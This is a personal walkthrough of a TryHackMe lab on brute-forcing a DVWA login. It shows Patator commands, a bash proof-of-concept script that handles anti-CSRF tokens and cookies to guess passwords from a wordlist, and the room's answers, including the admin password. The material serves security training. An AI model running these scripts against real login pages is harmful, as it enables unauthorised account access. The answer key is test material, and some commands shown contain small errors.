<h1 align="center">Brute Force Heroes</h1>
<h3 align="center">Practice $$\textcolor{#3bd62d}{\textnormal{Burp Suite . Hydra . Patator . OWASP ZAP . John The Ripper . Hashcat}}$$.</h3>
<p align="center">August 1, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>452</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
Walkthrough room to look at the different tools that can be used when brute forcing, as well as the different situations that might favour one tool over another.<br>
Click <a href="https://tryhackme.com/room/bruteforceheroes">here </a>to access this TryHackMe walkthrough.<br>
<img width="160px" src="https://github.com/user-attachments/assets/e404db20-0897-43ed-8baf-5e39a97a9c5f"><br>
<img width="1200px" src="https://github.com/user-attachments/assets/b8a95a6d-fe53-4092-801c-045e614f59a0"></p>

<br>

<h2>Task 1 . Launch The VM</h2>
<p>Start the VM attached to this task . This will launch a modified version of the DVWA at  MACHINE_IP . This is what we will be using to practice our brute forcing skills and tools against.<br>

It can take up to 5 minutes for the VM and associated service to launch, so give it a little room to breath. Go ahead and read the introduction below. Don't worry; we'll include a link in there for you too.</p>

<p><em>Answer the question below</em></p>

<p>1.1. Start your engines! Sorry... VM!<br>
<code>No answer needed</code></p>

<img width="1058" height="527" alt="image" src="https://github.com/user-attachments/assets/696a6865-7e8a-4b55-8270-31cda75e8bcd" />

<br>
<br><h2>Task 2 . Introduction</h2>
<p>Welcome to Brute Force Hero's. We're going to look at brute force from a zero to hero approach. Covering what brute forcing is, the different tools we can use (despite what you might believe Hydra isn't the only option we have), and the when's and whys behind using these different tools.<br>

If you're already familiar with the concepts behind brute forcing please feel free to skip ahead and get right into it in the next task. The rest of us will take 5 minutes to look at what exactly brute forcing is.</p>

<h3>What is brute forcing?</h3>
<p>Simply put brute forcing is just guesswork - Though we try our best to make it educated:</p>

<p align="center"><img width="200px" src="https://github.com/user-attachments/assets/bce82b8a-79ec-4f41-a610-199e041c513e"></p>

<p>The difference between doing it in person and trying to login to a service or resource is that we have to try and make sure our guesses are not only correct but that we're also speaking the correct language and we've formatted our guess correctly.<br>

Imagine if in the above scenario the old schoolmate spoke a different language to us (it was a foreign exchange programme) - We could guess all day, but we might never know if we got it right, especially if our pronunciation is off or we build our sentences differently:<br>

    Is your name Dave?<br>
    Dave is your name?<br>
    You're Dave right?</p>

<p>If you look at popular tools like Hydra there are a whole load of supported formats:<br>

It supports the following formats: Cisco AAA, Cisco auth, Cisco enable, CVS, FTP, HTTP(S)-FORM-GET, HTTP(S)-FORM-POST, HTTP(S)-GET, HTTP(S)-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MySQL, NNTP, Oracle Listener, Oracle SID, PC-Anywhere, PC-NFS, POP3, PostgreSQL, RDP, Rexec, Rlogin, Rsh, SIP, SMB(NT), SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.</p>

<p>This is normally where people have issues - Making sure that their brute force requests match the expected format and are going to be accepted and processed as expected by the receiving service or resource. <br>

Another issue we might face when trying to brute force a login is that it is not stealthy.<br>

Going back to our schoolmate comparison, after a couple of guesses, people nearby will start to notice that you're just saying random names at someone. The same thing is going to happen if you're taking random guesses at a user's login online.<br>

Anyone monitoring the traffic will notice a sudden increase in login attempts, with most of them being wrong. That's going to raise some red flags. Plus, if they have automated lockout or failed attempt protection enabled, it's going to make it difficult for you.</p>

<h3>GUI v CLI</h3>
<p>There are multiple tools which can be used for brute forcing - One of the most common is the ever-popular Hydra.<br>

But it isn't the only tool or necessarily the best choice, depending on the situation. During this lab, we will look at four tools that can be used for brute forcing. Two will GUI based (Burp Suite and OWASP ZAP) the other two will be CLI base (Hydra and Patator).<br>

There is no need to have prior experience using these tools as we will cover the relevant steps for each one during this room. But we have linked some other THM rooms which people might find useful. Go ahead and have a play!<br>

Patator is not as well known as Hydra - So if this is your first time using it, fear not! We will cover everything you need to know to bring you up to speed. If you are using a Kali or Parrot OS then chances are it is pre-installed. If it isn't, then you can install it using apt:

<code>sudo apt install patator</code><br>

Or visit the github page<br><br>

If you're using the attack box that comes with THM, and  sudo apt install patator, then to get patator working correctly, you will need to link it to a python2 runtime. One way to do that is to setup a virtual python environment. If you're unsure how to do that, follow these steps (which assume you're using the THM box and running as root):<br>

<code>apt install virtualenv</code><br>

<code>cd ~</code><br>

<code>virtualenv -p `which python2` venv</code><br>

<code>source venv/bin/activate</code><br><br>
You should then see that your shell prompt has <code>(venv</code> in front of it and that patator runs with no problems like this:</p>

<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/2330b353-3275-4d07-b7e9-59be8a87d252"></p>

<p>This will make sure that Patator is linked to the version of Python that it needs to run (as it will error otherwise). If you are using the attack box and clone the github repo then you won't need to make this change.<br>

Once you have Patator installed (as well as the other tools), go ahead and move on to the next task, where we'll get started using Burp Suite.</p>

<p><em>Answer the question below</em></p>

<p>2.1. Read the above and ensure you are ready to start<br>
<code>No answer needed</code></p>


```bash
:~/BruteForceHeroes# sudo apt install python3-venv
```

```bash
:~/BruteForceHeroes# python3 -m venv rose
```

```bash
:~/BruteForceHeroes# source rose/bin/activate
(rose) ...:~/BruteForceHeroes# 
```

```bash
(rose) ...:~/BruteForceHeroes# sudo apt install patator
```

```bash
(rose) ...:~/BruteForceHeroes# patator
...
Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + ajp_fuzz      : Brute-force AJP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + rlogin_login  : Brute-force rlogin
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + rdp_login     : Brute-force RDP (NLA)
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward DNS lookup
  + dns_reverse   : Reverse DNS lookup
  + snmp_login    : Brute-force SNMP v1/2/3
  + ike_enum      : Enumerate IKE transforms
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases
  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module
```


<br>
<h2>Task 3 . Getting Started - Burp Suite</h2>
<p>First thing first, download the attached password file. This is a custom password file built specifically for this room. Make sure you save it somewhere readily accessible as it will be used a lot in this room.

Next fire up Burp Suite. We'll start off by using this to proxy our web traffic to and from the target (the modified DVWA instance at xx.xxx.xxx.xxx ) . Depending on your version of Burp Suite you can either use the inbuilt browser:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/6051d8b7-f691-4348-a58c-7f26641c3775"></p>

<p>Or set your browser to use Burp Suite as a proxy - Port Swigger (the people behind Burp Suite) have a great guide here, so if you're unsure, follow that. Whichever browser you're using your proxy settings will need to look something like this:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/224f1b33-e620-4aad-b3f2-7113b4999109"></p>

<p>Assuming you haven't made any changes to the Burp Suite defaults.<br>

Once Burp Suite is up and running, go ahead and access the DVWA instance by pointing your web browser at http://xx.xxx.xxx.xxx. You should be met with a login screen. I recommend turning off the intercept (it's under the Proxy->Intercept tab and can be seen in the first screenshot above). We don't really need it for this task, and it is going to get really annoying if you have to manually forward each and every request. Instead, we'll be able to do everything we want from the HTTP history tab. So your screen should look like this:</p>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/00a0b6da-e0a2-4bd6-956a-7f84a9c077c5"></p>

<p>Now try and login - We'll give you the username admin - The password we're going to try and work out ourselves.  For those of you who have played around with DVWA before, the default credentials have been changed. It's vulnerable, but not that vulnerable. Make a couple of login attempts and look at the traffic in your HTTP history tab on Burp Suite. It should look something like this:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/b831b95e-142e-49ad-b793-e651a4a29b45"></p>

<p>Each login attempt made via a POST request is met with a 302 response code message before we're redirected back to the login page... You'll also notice that each response to our login attempt is essentially blank. But we can see a message on the login page itself which says Login Failed. That message is actually part of the next request, as we can see here:</p>

<h6 align="center"><img width="800px" src="https://github.com/user-attachments/assets/0f25df59-c698-4718-a858-b8daeb752a19"><br></h6>


<p>This is important, and we'll come back to why in a little bit... But for now. It's Brute Force time!</p>

<p><em>Answer the question below</em></p>

<p>3.1. What does HTTP response code 302 mean? Hint: <em>Checkout the MDN webdocs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status</em><br>
<code>Found</code></p>

<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/5a56298b-c8da-44ee-b654-05c8131fee2c"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/8f42c566-b56f-4f28-8b08-d0d0f75c748d"><br><br></h6>

<br>
<h3>Task 4 . Brute Forcing - Burp Suite</h3>
<p>So now we have some real requests we can examine. We can use these to template our brute force requests. In our previous analogy, we've got the language, and how the sentence is formatted, we just need to keep swapping the names out. Right click a login attempt request from our HTTP history and then click <strong>Send to Intruder</strong>:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/b5bc24ae-f4d8-48e7-9ea5-ed12971f6aa3"></p>

<p>You should then notice that the Intruder tab at the top is flashing. Click on the tab and then click <strong>Positions</strong> which will be along the top of the Intruder tab:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/dd553503-74b1-4d14-a31c-4d39b6550e71"></p>

<p>Next, within the Positions window, hit the <strong>Clear</strong> button - This will remove all the preset positions which Burp Suite will have pre-populated for us.  Burp Suite will automatically select any value on the right side of a '=' . For our case, the only value we want to set as a position that Burp Suite will replace in each attempt is the <strong>password</strong> value. Click the password value (in this instance, it is password, but depending on what you typed it could be different) and click <strong>Add</strong>. This will set the payload position, and we'll be ready to move on to the next stage.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/5fc8a2b3-c8c2-4afd-b27b-c4511f153715"></p>

<p>The <strong>Intruder->Payloads</strong> tab is where we add the payload to be used in the replacement. Burp Suite will take the payload we provide and use its values to replace our marked value. There are a few options here for loading payloads. We are going to load the password file provided in this room by clicking <strong>Load</strong> ... within the <strong>Payload Options [Simple List]</strong> section. Select the passwords.txt file you downloaded, and you should see the contents are loaded in, which should look like the below:</p>

<p align="center"><img width="400px" src="https://github.com/user-attachments/assets/3c902cee-4ccc-4141-95b7-eaf43b20db00"></p>

<p>Now at this stage, we're ready to launch our attack. Click <strong>Strat attack</strong>; if (like me) you're using the Community Edition, then a popup will appear. The TL;DR is that because you're using the free version, your attack will be throttled. Click Ok, and then the attack dialogue box itself will appear. It will show the payload value used in each attempt, the response code, and the response length. These are our indicators that our login attempt(s) have or haven't been successful. If we notice a different response code or different response length we should investigate these responses further to confirm whether or not this was a successful attempt, or it was an error of some kind. An example error would be if you used a large password file with some special characters that the end service couldn't process correctly.<br>

Now. This is where I have a confession to make. The screenshot below shows me trying to brute force the login. The value I have covered over is the correct password. Notice anything strange about the successful password?</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/60f8d80e-b187-45bf-a46c-5b2b2582c7a6"></p>

<p><em>(N.B. For those of you about to try and just look through the password file to work out the correct value - I replaced the value at that location in the file with the correct password. I like your thinking, but it won't be that easy. Try it if you don't believe me. )</em></p>

The strange thing is that the response codes and response lengths are all the same, even for the successful password. You have no evidence from the attack dialogue box that this is the correct password, but it is, I promise, and I can even prove it (sort of).<br>

The image below shows what a successful login attempt really looks like. The initial response to the login is actually the same as we saw with our incorrect logins, a 302 redirect response. But the next request is different! It doesn't redirect us to login.php (check the earlier screenshots). Instead, we go to the index.php page. We can also see that in the response for a successful login, the Location Response Header is different. So we could look at the redirect destination to tell if our login attempt was successful or not. One problem, Intruder only shows us the initial response (the redirect itself), not the destination...</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/c7d6ec24-2899-414c-ad30-925f3df3b146"></p>

<p>Now those of you who are observant might have noticed that in our screenshot of the successful intruder attack, the response to the correct password attempt had a Response Header called Location, which was set to login.php. Well, one of the other issues with Burp Suite is that it will reuse the same original request. That might work in some instances, but not for all of them. If the server is expecting a unique user_token for each login attempt and it gets the same one reused multiple times, we might not be able to get in even with the correct password. Back to what we said at the start - The format for our request needs to be what the server expects. If it isn't, we're not going to get very far.<br>

But don't lose hope just yet! We know what won't work, and importantly, we know why (or we can make some pretty educated guesses as to why). All we need to do now is change tactics. Remember Try Harder is all well and good, but sometimes we need to couple that with Try Smarter.<br>

Also, if you've got this far and Burp Suite is still running your brute force attempt, I'd turn it off. For now, at least.<br>

N.B - It is possible to use things like Burp Suite Macros to help us get around the use of things like the unique user_token. However that is outside the scope of this room. I would recommend visiting Burp Suite Basics for more info.</p>

<p><em>Answer the questions below</em></p>

<p>4.1. What's an easy way for us to tell the difference between a failed and a successful login attempt in the above? Hint : <em>Which Response Header?</em><br>
<code>Location Response Header</code></p>

<br>

<p>4.2. Can we use Burp Suite to effectively brute force the login in this instance? (Yay/Nay)<br>
<code>Nay</code></p>


<h6 align="center"><img width="1200px" src="https://github.com/user-attachments/assets/45773933-7af8-41a2-a5ab-7b68cb5c8012"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/5a56298b-c8da-44ee-b654-05c8131fee2c"><br><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/d374c291-4120-46de-8dc2-897e8e6e5a0f"><br></h6>

<br>
<h2>Task 5 . Brute forcing - Patator</h2>
<p>So we tried with Burp Suite - But it turns out this isn't the right tool for this job.<br>

But it was still a great starting point, we were able to work out the request syntax (how the login request is formed), and we can use that information going forward to try a different tool. <br>

Now, this is a brute forcing room - So surely we'll use Hydra now, right?<br>

Nope! (You clearly didn't read the task name, by the way). It's Patator to the rescue!</p>

<p align="center"><img width="150px" src="https://github.com/user-attachments/assets/b20124bf-0fe2-4bcc-bea9-d641c12a68fe"></p>

<p>I've chosen Patator for a couple of reasons - One is that it's not a widely used tool, despite (I think) being fantastic at what it does. The second is that Hydra isn't our best bet here either. You only have to do a quick search to find that people have had plenty of issues trying to brute force DVWA with Hydra (like this issue thread here). We could use a different version of Hydra, such as 8.1 on Ubuntu, but let's see if we can't find a different tool to do the job and hopefully add something new and useful to your CTF arsenal. So let's get started.<br>

So first thing first - Let's look at Patator a bit before we get started. If you run <code>patator -h</code>, you'll get the following output listing the available modules (remember to run the command we gave you in the Introduction section in order to allow Patator to run correctly on the AttackBox):</p>

<p align="center"><img width="500px" src="https://github.com/user-attachments/assets/d3e7697c-b8dd-4003-918f-d947b2ec4351"></p>

<p>There are a lot of modules. We won't be playing with them all (today), but we can see one that is of immediate interest to us <code>http_fuzz</code>, so let's look at that. Type <code>patator http_fuzz -h</code> and look through the options for this module. Looking at the available options, we can break our command down into the required parts:</p>

```bash
patator http_fuzz method=<HTTP METHOD> \
url=<target url> \
body=<data> \
header=<headers> \
-x quit:<condition>
```

<p>Now here is where we look back at our Burp Suite requests (see, there was a reason I made us use Burp Suite first). </p>

<p align="center"><img width="900px" src="https://github.com/user-attachments/assets/b6a2ecba-05b2-4ab5-80e2-307344714566"></p>

<p>So using what we know we can construct the following command:</p>

```bash
patator http_fuzz method=POST \
url="http://10.201.107.100/login.php" \
body="username=admin&password=password&Login=Login&user_token=21e0ad6d56fa24f77647ef7dabd21be8" \
header="Cookie: PHPSESSID=lq805gkohiamc501riahr6jltk; security=impossible" \
-x quit:fgrep!=login.php
```

<p>The <code>url</code>,<codebody</code>, and <code>header</code> fields can be copied directly from the Burp Suite window. The quit condition is checking that the returned response does not 
contain the text login.php.

- We need to add in our payload so we can incrementally swap out the password each time with one from our list.<br>
- We don't want to be re-sending the same user_token and Cookie value.<br><br>
Thankfully, with a bit of bash magic, we can create a script to dynamically generate those values for us - And we don't even have to do all the heavy lifting ourselves, thanks to g0tm1lk . We can take the script they've made and adapt it for our own brute force attempts. Our script should now look like this:</p>


```bash
IP=10.201.107.100

CSRF=$(curl -s -c dvwa.cookie "${IP}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)

SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

echo "The CSRF is: $CSRF"

echo "The PHPSESSID is: $SESSIONID"

patator http_fuzz method=POST --threads=64 timeout=10 \
url="http://${IP}/login.php" \
0=passwords.txt \
body="username=admin&password=FILE0&Login=Login&user_token=${CSRF}" \
header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" \
-x quit:fgrep!=login.php
```

<p>N.B. If you find that when you run the above, you get errors about k,v pairs try changing the script so that the patator command is all on one line. Like this:</p>

```bash
patator http_fuzz method=POST --threads=64 timeout=10 url="http://${IP}/login.php" 0=passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=${CSRF} header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" -x quit:fgrep!=login.php
```

<p>When you run this script, you might notice something - When it stops, it's not easy to tell which password is actually the correct one. We can filter out all the wrong passwords using the -x ignore: action. The syntax and format are basically the same as the quit action. So all you need to do is test and adjust... I've even made the correct command the answer to Question 1. So if you get that right, you know you're good to go. If you get stuck, think about what text is in the response if the result was incorrect. We can ignore those responses and not print them to the screen.<br>

Add the -x ignore: action to the end of your existing patator command (right after the quit action), and the only result you'll get will be the admin password!</p>

<p><em>Answer the questions below</em></p>

<p>5.1. What action can we use to show only the correct password (the answer includes '  ')?<br>
<code>-x ignore:fgrep='Location: login.php'</code></p>

```bash
:~/BruteForceHeroes# patator http_fuzz method=POST --threads=64 timeout=10 url="http://10.201.76.76/login.php" 0=/root/BruteForceHeroes/passwords.txt body="username=admin&password=FILE0&Login=Login&user_token=70d5a777a1d13f532d6edbba6c3c4071/login.php" header="Cookie: PHPSESSID=69dr414b9i2kvao0mk74drkb3r; security=impossible" -x ignore:fgrep='Location:login.php'
...
23:35:53 patator    FAIL - xxx  89:-1         27.675 | 123456                             |     1 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.784 | 123456789                          |     3 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.777 | password                           |     4 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.755 | iloveyou                           |     5 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.734 | rockyou                            |     8 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.681 | 12345678                           |     9 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.737 | abc123                             |    10 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.696 | nicole                             |    11 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.631 | monkey                             |    14 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.668 | lovely                             |    15 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.681 | jessica                            |    16 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.678 | 654321                             |    17 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.664 | michael                            |    18 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.668 | ashley                             |    19 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.769 | qwerty                             |    20 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.768 | 111111                             |    21 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.759 | 000000                             |    23 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.755 | michelle                           |    24 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.731 | tigger                             |    25 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.742 | sunshine                           |    26 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.724 | chocolate                          |    27 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.711 | password1                          |    28 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.709 | anthony                            |    30 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.703 | butterfly                          |    32 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.680 | purple                             |    33 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.717 | liverpool                          |    36 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.704 | justin                             |    37 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.694 | loveme                             |    38 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.717 | 123123                             |    39 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.685 | secret                             |    41 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.613 | jennifer                           |    44 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.627 | joshua                             |    45 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.604 | superman                           |    48 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.606 | hannah                             |    49 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.617 | loveyou                            |    51 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.629 | pretty                             |    52 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.607 | basketball                         |    53 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.608 | angels                             |    55 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:53 patator    FAIL - xxx  89:-1         27.588 | tweety                             |    56 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:57 patator    FAIL - xxx  89:-1         30.651 | andrew                             |    54 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:57 patator    FAIL - xxx  89:-1         30.639 | flower                             |    57 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:57 patator    FAIL - xxx  89:-1         30.655 | playboy                            |    58 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:57 patator    FAIL - xxx  89:-1         30.649 | elizabeth                          |    60 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:57 patator    FAIL - xxx  89:-1         30.642 | tinkerbell                         |    62 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:57 patator    FAIL - xxx  89:-1         30.644 | charlie                            |    63 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
23:35:57 patator    FAIL - xxx  89:-1         30.652 | samantha                           |    64 | <class 'pycurl.error'> (7, 'Failed to connect to 10.201.76.76 port 80: No route to host')
clear
...
```

<img width="1084" height="455" alt="image" src="https://github.com/user-attachments/assets/95cbba7c-82ec-4979-af54-1826e176fafa" />

<br>
<br>
<p>

- waited for a loooooooooong time for patator execution ... FAIL ... FAIL ... FAIL<br>
- decided to use gotm1lk instead<br>    
- navigated to https://<coe>blog.g0tmi1k.com/dvwa/login/</code></p>

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/51c62612-58e6-45b9-abf4-1564e0dfe08c"></p>

<p>

- <code>passwords.txt</code> is the Task File downloaded<br>
- <code>user.txt</code> is a file containing <code>admin</code></p>

<p align="center"><em>g0tmi1k´s <code>PoC</code></em></p>

```bash
#!/bin/bash
# Quick PoC template for HTTP POST form brute force, with anti-CRSF token
# Target: DVWA v1.10
#   Date: 2015-10-19
# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
# Source: https://blog.g0tmi1k.com/dvwa/login/

## Variables
URL="http://10.201.107.100/login.php"
USER_LIST="user.txt"
PASS_LIST="passwords.txt"

## Value to look for in response (Whitelisting)
SUCCESS="Location: index.php"

## Anti CSRF token
CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"
[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

## Counter
i=0

## Password loop
while read -r _PASS; do

  ## Username loop
  while read -r _USER; do

    ## Increase counter
    ((i=i+1))

#    ## Feedback for user
#    echo "[i] Try ${i}: ${_USER} // ${_PASS}"

    ## Connect to server
    #CSRF=$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )
    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"
    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

    ## Check response
    echo "${REQUEST}" | grep -q "${SUCCESS}"
    if [[ "$?" -eq 0 ]]; then
      ## Success!
      echo -e "\n\n[i] We did it ..."
      echo        "[i] ---------- Username : ${_USER}"
      echo        "[i] ---------- Password : ${_PASS}"
      break 2
    fi

  done < ${USER_LIST}
done < ${PASS_LIST}

## Clean up
rm -f /tmp/dvwa.cookie
```

<p>5.2. What is the admin password?<br>
<code>1qaz@WSX</code></p>

<p>
    
- <code>admin</code> : <code>1qaz@WSX</code></p>

```bash
:~/BruteForceHeroes# ./PoC


[i] We did it ...
[i] ---------- Username : admin
[i] ---------- Password : 1qaz@WSX
```

<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/e4f34daf-e280-4141-b711-b53a0da0f8d2"></p>

<br>
<br>
<h2>Task 6 . Brute forcing - ZAP</h2>
<p>Congratulations! Not only did you brute force the main login for the admin, but you did it while the security was set to "Impossible" - If this is your first time brute forcing be impressed with yourself, time for tea and medals all round.<br>

But we can't rest on our laurels for long. Remember, we were beaten at the first hurdle with a GUI tool. So let's see if we can't redeem ourselves in that area. Download the userlist.txt we've attached, and let's get started. This task will focus on the use of OWASP ZAP, a great tool for web application pen testing; just remember to take the automated warnings and alerts with a pinch of salt. A good pen tester should manually check listed vulnerabilities reported by automated tools, you'll look silly if it comes to report time, and it turns out the tool (and now, by extension, you) were wrong.<br>

But we're not going to go into the different uses of OWASP ZAP here (though I recommend playing around with the tool and checking out the room linked in the introduction). We're focused on how it can help us brute force.<br>

First things first, start the OWASP ZAP application. Depending on the platform you are using, this may be in a number of different places. If you are using the THM AttackBox, this is found at the Applications->Web->OWASP ZAP menu option. The latest versions of Kali have this tool pre-installed, and it is located at Applications->Web Application Analysis->ZAP. Older Kali or other distributions may not have this pre-installed. If not, you can install it from the ZAP Download page.<br>

